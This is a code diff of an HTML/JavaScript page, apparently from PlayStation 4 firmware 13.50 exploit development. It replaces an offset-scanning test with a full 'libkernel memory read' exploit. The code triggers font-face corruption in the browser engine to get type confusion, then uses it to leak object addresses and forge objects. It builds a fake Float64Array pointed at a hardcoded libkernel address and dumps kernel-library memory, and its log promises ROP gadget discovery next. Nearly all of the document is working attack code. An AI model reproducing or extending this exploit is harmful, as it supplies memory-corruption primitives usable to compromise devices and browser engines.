@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 13.50 - Offset Scan</title>
+<title>PS4 13.50 - libkernel Read</title>
 <style>
     * {
         margin: 0;
@@ -31,17 +31,23 @@
         border-radius: 15px;
         margin-bottom: 30px;
         box-shadow: 0 0 30px rgba(0, 255, 65, 0.3);
+        animation: glow 2s ease-in-out infinite alternate;
+    }
+    
+    @keyframes glow {
+        from { box-shadow: 0 0 20px rgba(0, 255, 65, 0.3); }
+        to { box-shadow: 0 0 40px rgba(0, 255, 65, 0.6); }
     }
     
     .header h1 {
-        font-size: 2.2em;
+        font-size: 2.5em;
         text-shadow: 0 0 20px rgba(0, 255, 65, 0.8);
         margin-bottom: 10px;
         letter-spacing: 3px;
     }
     
     .header .subtitle {
-        font-size: 1.1em;
+        font-size: 1.2em;
         color: #00cc33;
         letter-spacing: 2px;
     }
@@ -50,7 +56,7 @@
         display: block;
         margin: 0 auto 30px;
         padding: 20px 50px;
-        font-size: 1.4em;
+        font-size: 1.5em;
         font-weight: bold;
         border: 3px solid #00ff41;
         background: linear-gradient(135deg, rgba(0, 255, 65, 0.1) 0%, rgba(0, 255, 65, 0.2) 100%);
@@ -118,21 +124,20 @@
     .warning { color: #ffaa00; }
     .info { color: #00ccff; }
     .highlight { color: #ff00ff; font-weight: bold; }
-    .pattern { color: #666; }
 </style>
 </head>
 <body>
 
 <div class="container">
     <div class="header">
-        <h1>◈ OFFSET SCAN ◈</h1>
-        <div class="subtitle">Finding real address at memory offsets</div>
+        <h1>◈ LIBKERNEL READER ◈</h1>
+        <div class="subtitle">Fake TypedArray → Read libkernel Memory</div>
     </div>
     
-    <button class="btn" onclick="runTest()">► SCAN OFFSETS</button>
+    <button class="btn" onclick="runExploit()">► READ LIBKERNEL</button>
     
     <div class="log-container">
-        <div class="log-header">◈ SCAN RESULTS ◈</div>
+        <div class="log-header">◈ EXPLOIT LOG ◈</div>
         <div id="log"></div>
     </div>
 </div>
@@ -148,12 +153,11 @@ function log(msg) {
     if (d) {
         d.innerHTML = logBuf.map(line => {
             let className = '';
-            if (line.includes('[+++]') || line.includes('REAL ADDRESS')) className = 'success';
+            if (line.includes('[+++]')) className = 'success';
             else if (line.includes('[ERROR]')) className = 'error';
             else if (line.includes('[!]')) className = 'warning';
-            else if (line.includes('[DIFF]')) className = 'highlight';
             else if (line.includes('[+]')) className = 'info';
-            else if (line.includes('pattern')) className = 'pattern';
+            else if (line.includes('0x7F')) className = 'highlight';
             
             return `<span class="${className}">${line}</span>`;
         }).join('\n');
@@ -164,6 +168,12 @@ function log(msg) {
 function hex(n) {
     if (n < 0) n = n >>> 0;
     return '0x' + n.toString(16).padStart(8, '0');
+}
+
+function hex64(low, high) {
+    if (low < 0) low = low >>> 0;
+    if (high < 0) high = high >>> 0;
+    return '0x' + high.toString(16).padStart(8, '0') + '_' + low.toString(16).padStart(8, '0');
 }
 
 class Int64 {
@@ -179,20 +189,32 @@ class Int64 {
         return new Int64(parts[0], parts[1]);
     }
     
+    asDouble() {
+        let buf = new ArrayBuffer(8);
+        let u32 = new Uint32Array(buf);
+        u32[0] = this.low;
+        u32[1] = this.high;
+        return new Float64Array(buf)[0];
+    }
+    
     toString() {
-        return '0x' + this.high.toString(16).padStart(8,'0') + '_' + this.low.toString(16).padStart(8,'0');
+        return hex64(this.low, this.high);
     }
 }
 
-function runTest() {
+// libkernel base address from dump
+const LIBKERNEL_BASE = new Int64(0x75C00000, 0x7F8B49F3);
+
+function runExploit() {
     logBuf = [];
     
     log('═══════════════════════════════════════════════════════');
-    log('       OFFSET SCAN - FIND REAL ADDRESS                 ');
+    log('     PS4 13.50 - LIBKERNEL MEMORY READ EXPLOIT          ');
     log('═══════════════════════════════════════════════════════\n');
     
-    log('[THEORY] Real address might be at offset from store point');
-    log('[METHOD] Store object at index N, read indices N-5 to N+5\n');
+    log('[TARGET] libkernel base: ' + LIBKERNEL_BASE.toString());
+    log('[GOAL] Create fake TypedArray pointing to libkernel');
+    log('[GOAL] Read libkernel memory to verify access\n');
     
     // Setup
     let style = document.createElement('style');
@@ -200,6 +222,7 @@ function runTest() {
     style.textContent = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
     document.head.appendChild(style);
     
+    // Create arrays BEFORE corruption
     let floatArray = new Float64Array(100);
     let objectArray = new Array(100);
     
@@ -208,7 +231,14 @@ function runTest() {
         objectArray[i] = { id: i };
     }
     
-    log('[SETUP] Arrays created\n');
+    log('[SETUP] Arrays created and pre-filled\n');
+    
+    // Create controlled buffer for fake object
+    let fakeObjBuffer = new ArrayBuffer(0x1000);
+    let fakeU32 = new Uint32Array(fakeObjBuffer);
+    let fakeF64 = new Float64Array(fakeObjBuffer);
+    
+    log('[SETUP] Created fake object buffer (4KB)\n');
     
     let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
     document.fonts.add(A);
@@ -222,7 +252,7 @@ function runTest() {
             if (!fired && this === A) {
                 fired = true;
                 
-                log('[*] Inside getter\n');
+                log('[PHASE 1] ▼▼▼ INSIDE GETTER ▼▼▼\n');
                 
                 // Create corrupted fonts
                 let corrupted = [];
@@ -232,199 +262,188 @@ function runTest() {
                     }));
                 }
                 
-                // Trigger
+                log('[CORRUPTION] Created ' + corrupted.length + ' fonts');
+                
+                // Trigger corruption
                 document.getElementById('s').sheet.deleteRule(0);
                 document.body.offsetTop;
                 
-                log('[CORRUPTION] Active\n');
+                log('[CORRUPTION] ✓ Triggered!\n');
                 
-                // Required setup
-                log('[SETUP] Tests 1-3...');
+                // ═══════════════════════════════════════════
+                // REQUIRED SETUP (Tests 1-3)
+                // ═══════════════════════════════════════════
+                
+                log('[PHASE 2] ▼▼▼ REQUIRED SETUP ▼▼▼\n');
+                
                 try {
                     let v1 = corrupted[0];
                     let _ = v1.status;
+                    log('[TEST 1] ✓ Font property access');
+                    
                     let v2 = corrupted[1];
-                    v2.prop = { x: 1 };
+                    v2.customProp = { x: 1 };
+                    log('[TEST 2] ✓ Object stored in font');
+                    
                     let v3 = corrupted[2];
                     floatArray[50] = v3;
-                    log('[SETUP] ✓ Complete\n');
+                    log('[TEST 3] ✓ Font stored in float array\n');
+                    
                 } catch(e) {
-                    log('[SETUP] ! Error\n');
+                    log('[SETUP] ! ERROR: ' + e.message + '\n');
                 }
                 
                 // ═══════════════════════════════════════════
-                // MAIN SCAN: Read surrounding indices
+                // BUILD FAKE FLOAT64ARRAY STRUCTURE
                 // ═══════════════════════════════════════════
                 
-                log('╔════════════════════════════════════════════════╗');
-                log('║         SCANNING OFFSETS -10 to +10            ║');
-                log('╚════════════════════════════════════════════════╝\n');
+                log('[PHASE 3] ▼▼▼ BUILDING FAKE TYPEARRAY ▼▼▼\n');
                 
-                let targetObj = { 
-                    marker: 0xDEADBEEF, 
-                    test: "TARGET",
-                    id: 9999 
-                };
+                log('[*] Creating fake Float64Array structure in buffer...');
                 
-                let storeIdx = 50;
+                // Offset in our buffer where we'll build the fake array
+                let fakeOffset = 0x100; // 256 bytes in
+                let fakeIdx = fakeOffset / 4; // u32 index
                 
-                log('[*] Target object: ' + JSON.stringify(targetObj));
-                log('[*] Storing at objectArray[' + storeIdx + ']\n');
+                // JSC Float64Array structure (approximate):
+                // +0x00: JSCell header (m_structureID, m_indexingType, m_type, m_flags, m_cellState)
+                // +0x08: Butterfly pointer (can be 0 for TypedArrays)
+                // +0x10: Vector pointer (THIS IS WHAT WE CONTROL - points to data)
+                // +0x18: Length (as Int64)
+                // +0x20: Mode/Flags
                 
-                objectArray[storeIdx] = targetObj;
+                // JSCell header - approximate values for Float64Array
+                fakeU32[fakeIdx + 0] = 0x0108; // m_structureID (guess)
+                fakeU32[fakeIdx + 1] = 0x00182700; // m_indexingType/type/flags
                 
-                log('[SCAN] Reading floatArray[' + (storeIdx-10) + '] through [' + (storeIdx+10) + ']:\n');
+                // Butterfly (null for TypedArrays)
+                fakeU32[fakeIdx + 2] = 0x0;
+                fakeU32[fakeIdx + 3] = 0x0;
                 
-                let findings = [];
+                // Vector pointer - POINTS TO LIBKERNEL!
+                fakeU32[fakeIdx + 4] = LIBKERNEL_BASE.low;
+                fakeU32[fakeIdx + 5] = LIBKERNEL_BASE.high;
                 
-                for (let offset = -10; offset <= 10; offset++) {
-                    let readIdx = storeIdx + offset;
+                log('[+] Vector pointer set to: ' + LIBKERNEL_BASE.toString());
+                
+                // Length - 0x1000 elements (32KB worth of Float64s)
+                let lengthAddr = new Int64(0x1000, 0x00010001);
+                fakeF64[(fakeOffset / 8) + 3] = lengthAddr.asDouble();
+                
+                log('[+] Array length: 0x1000 elements');
+                log('[+] Fake structure built at buffer offset ' + hex(fakeOffset) + '\n');
+                
+                // ═══════════════════════════════════════════
+                // USE FAKEOBJ TO GET REFERENCE
+                // ═══════════════════════════════════════════
+                
+                log('[PHASE 4] ▼▼▼ CREATING FAKE OBJECT ▼▼▼\n');
+                
+                log('[*] Attempting to use fakeobj primitive...');
+                
+                // We need the ADDRESS of our fake structure in fakeObjBuffer
+                // Problem: we don't know fakeObjBuffer's address
+                // Workaround: Store fakeObjBuffer in objectArray, see if we can leak its address
+                
+                log('[*] Storing fakeObjBuffer in objectArray[60]...');
+                objectArray[60] = fakeObjBuffer;
+                
+                let bufferAddr = floatArray[60];
+                log('[*] Read floatArray[60]: ' + bufferAddr);
+                
+                if (typeof bufferAddr === 'number') {
+                    let addr = Int64.fromDouble(bufferAddr);
+                    log('[*] As Int64: ' + addr.toString());
                     
-                    if (readIdx < 0 || readIdx >= floatArray.length) continue;
-                    
-                    try {
-                        let value = floatArray[readIdx];
-                        let addr = Int64.fromDouble(value);
+                    if (addr.high !== 0) {
+                        log('[+] Got non-zero address for buffer!');
                         
-                        // Calculate expected pattern
-                        let expectedPattern = 1.1 * (readIdx + 1);
-                        let changed = Math.abs(value - expectedPattern) > 0.01;
+                        // Calculate address of our fake structure
+                        // fake structure is at buffer + 0x100
+                        let fakeStructAddr = new Int64(
+                            (addr.low + fakeOffset) >>> 0,
+                            addr.high
+                        );
                         
-                        // Build output
-                        let offsetStr = (offset >= 0 ? '+' : '') + offset;
-                        let idxStr = '[' + readIdx + ']';
-                        let addrStr = addr.toString();
+                        // Handle carry
+                        if ((addr.low + fakeOffset) > 0xFFFFFFFF) {
+                            fakeStructAddr.high = (fakeStructAddr.high + 1) >>> 0;
+                        }
                         
-                        let note = '';
+                        log('[+] Fake structure address: ' + fakeStructAddr.toString());
+                        log('[*] Storing as float in floatArray[70]...');
                         
-                        if (!changed) {
-                            note = '(pattern)';
-                        } else {
-                            // Check what changed
-                            if ((addr.high & 0xfff80000) === 0x7ff80000) {
-                                note = '[NaN-boxed]';
-                                findings.push({ offset, addr, type: 'nanbox' });
-                            } else if (addr.high >= 0x01000000) {
-                                note = '[DIFF - high word!]';
-                                findings.push({ offset, addr, type: 'highword' });
-                            } else if (addr.low !== 0) {
-                                note = '[DIFF - low word]';
-                                findings.push({ offset, addr, type: 'lowword' });
-                            } else {
-                                note = '[changed]';
+                        floatArray[70] = fakeStructAddr.asDouble();
+                        
+                        log('[*] Reading objectArray[70] (fakeobj)...');
+                        let fakeArray = objectArray[70];
+                        
+                        log('[*] Result type: ' + typeof fakeArray);
+                        
+                        if (typeof fakeArray === 'object' && fakeArray !== null) {
+                            log('[+++] GOT OBJECT BACK!\n');
+                            
+                            // Try to use it as array
+                            try {
+                                log('[PHASE 5] ▼▼▼ READING LIBKERNEL MEMORY ▼▼▼\n');
+                                
+                                log('[*] Attempting to read from fake array...');
+                                log('[*] This should read libkernel memory!\n');
+                                
+                                // Read first 16 values (128 bytes) from libkernel
+                                log('[LIBKERNEL DUMP] First 128 bytes:');
+                                log('');
+                                
+                                for (let i = 0; i < 16; i++) {
+                                    try {
+                                        let val = fakeArray[i];
+                                        let valAddr = Int64.fromDouble(val);
+                                        
+                                        let offset = hex(i * 8);
+                                        log('  +' + offset + ': ' + valAddr.toString());
+                                        
+                                    } catch(e2) {
+                                        log('  +' + hex(i * 8) + ': ERROR - ' + e2.message);
+                                        break;
+                                    }
+                                }
+                                
+                                log('');
+                                log('[+++] IF YOU SEE DATA ABOVE: SUCCESS!');
+                                log('[+++] We can read libkernel memory!');
+                                log('[+++] Can now find ROP gadgets!');
+                                
+                            } catch(e) {
+                                log('[ERROR] Failed to read from array: ' + e.message);
                             }
+                            
+                        } else {
+                            log('[-] Did not get object from fakeobj');
                         }
                         
-                        log(offsetStr.padStart(4, ' ') + ' ' + idxStr.padEnd(5, ' ') + ' ' + addrStr + ' ' + note);
-                        
-                    } catch(e) {
-                        log(offset.toString().padStart(4, ' ') + ' ERROR: ' + e.message);
-                    }
-                }
-                
-                log('\n');
-                
-                // ═══════════════════════════════════════════
-                // TEST MULTIPLE OBJECTS
-                // ═══════════════════════════════════════════
-                
-                log('╔════════════════════════════════════════════════╗');
-                log('║     TESTING MULTIPLE OBJECTS AT OFFSETS        ║');
-                log('╚════════════════════════════════════════════════╝\n');
-                
-                if (findings.length > 0) {
-                    log('[*] Found ' + findings.length + ' interesting offsets');
-                    log('[*] Testing with different objects...\n');
-                    
-                    let testObjs = [
-                        { name: "obj1", m: 0x1111 },
-                        { name: "obj2", m: 0x2222 },
-                        { name: "obj3", m: 0x3333 }
-                    ];
-                    
-                    for (let findingIdx = 0; findingIdx < Math.min(3, findings.length); findingIdx++) {
-                        let finding = findings[findingIdx];
-                        
-                        log('[OFFSET ' + finding.offset + '] Testing with 3 objects:');
-                        
-                        for (let objIdx = 0; objIdx < testObjs.length; objIdx++) {
-                            let obj = testObjs[objIdx];
-                            objectArray[storeIdx] = obj;
-                            
-                            let readIdx = storeIdx + finding.offset;
-                            let leaked = floatArray[readIdx];
-                            let addr = Int64.fromDouble(leaked);
-                            
-                            log('  ' + obj.name + ' → ' + addr.toString());
-                        }
-                        log('');
-                    }
-                }
-                
-                // ═══════════════════════════════════════════
-                // ANALYSIS
-                // ═══════════════════════════════════════════
-                
-                log('╔════════════════════════════════════════════════╗');
-                log('║              ANALYSIS                          ║');
-                log('╚════════════════════════════════════════════════╝\n');
-                
-                log('[FINDINGS]');
-                log('  Total changed values: ' + findings.length);
-                
-                if (findings.length === 0) {
-                    log('  [!] NO VALUES CHANGED from pattern');
-                    log('  [!] Arrays might not be overlapping');
-                    log('  [!] Try refreshing and running again');
-                } else {
-                    log('  Offsets with changes:');
-                    findings.forEach(f => {
-                        log('    ' + (f.offset >= 0 ? '+' : '') + f.offset + ': ' + f.addr.toString() + ' (' + f.type + ')');
-                    });
-                    
-                    log('\n[INTERPRETATION]');
-                    
-                    let hasVaryingAddrs = false;
-                    if (findings.length >= 3) {
-                        // Check if addresses vary per object
-                        log('  Testing if addresses vary per object...');
-                        // This would need the multi-object test results
-                        log('  Review multi-object test above');
-                    }
-                    
-                    let nonNanBox = findings.filter(f => f.type !== 'nanbox');
-                    if (nonNanBox.length > 0) {
-                        log('  [+++] Found non-NaN-boxed values at offsets!');
-                        log('  [+++] These might be real structure members!');
-                        log('  [+++] Possible: butterfly, backing store, etc.');
-                    }
-                    
-                    if (findings.some(f => f.type === 'highword')) {
-                        log('  [+++] Found values with significant high word!');
-                        log('  [+++] These are likely real pointers!');
+                    } else {
+                        log('[-] Buffer address is zero/invalid');
                     }
                 }
                 
                 log('\n[!] Returning - OOM will occur');
                 log('═══════════════════════════════════════════════════════\n');
-                
-                window.findings = findings;
             }
             
             return undefined;
         }
     });
     
-    log('[*] Starting scan...\n');
+    log('[*] Starting exploit...\n');
     document.fonts.load('1em x', 'AB');
 }
 
 log('═══════════════════════════════════════════════════════');
-log('          OFFSET SCAN READY                            ');
+log('        LIBKERNEL MEMORY READER READY                   ');
 log('═══════════════════════════════════════════════════════\n');
-log('[INFO] This will scan indices around stored object');
-log('[INFO] Looking for real address at offset\n');
-log('[READY] Click SCAN OFFSETS\n');
+log('[INFO] Target: Read libkernel at ' + LIBKERNEL_BASE.toString());
+log('[INFO] Method: Fake TypedArray with libkernel backing store\n');
+log('[READY] Click READ LIBKERNEL\n');
 
 </script>
 </body>
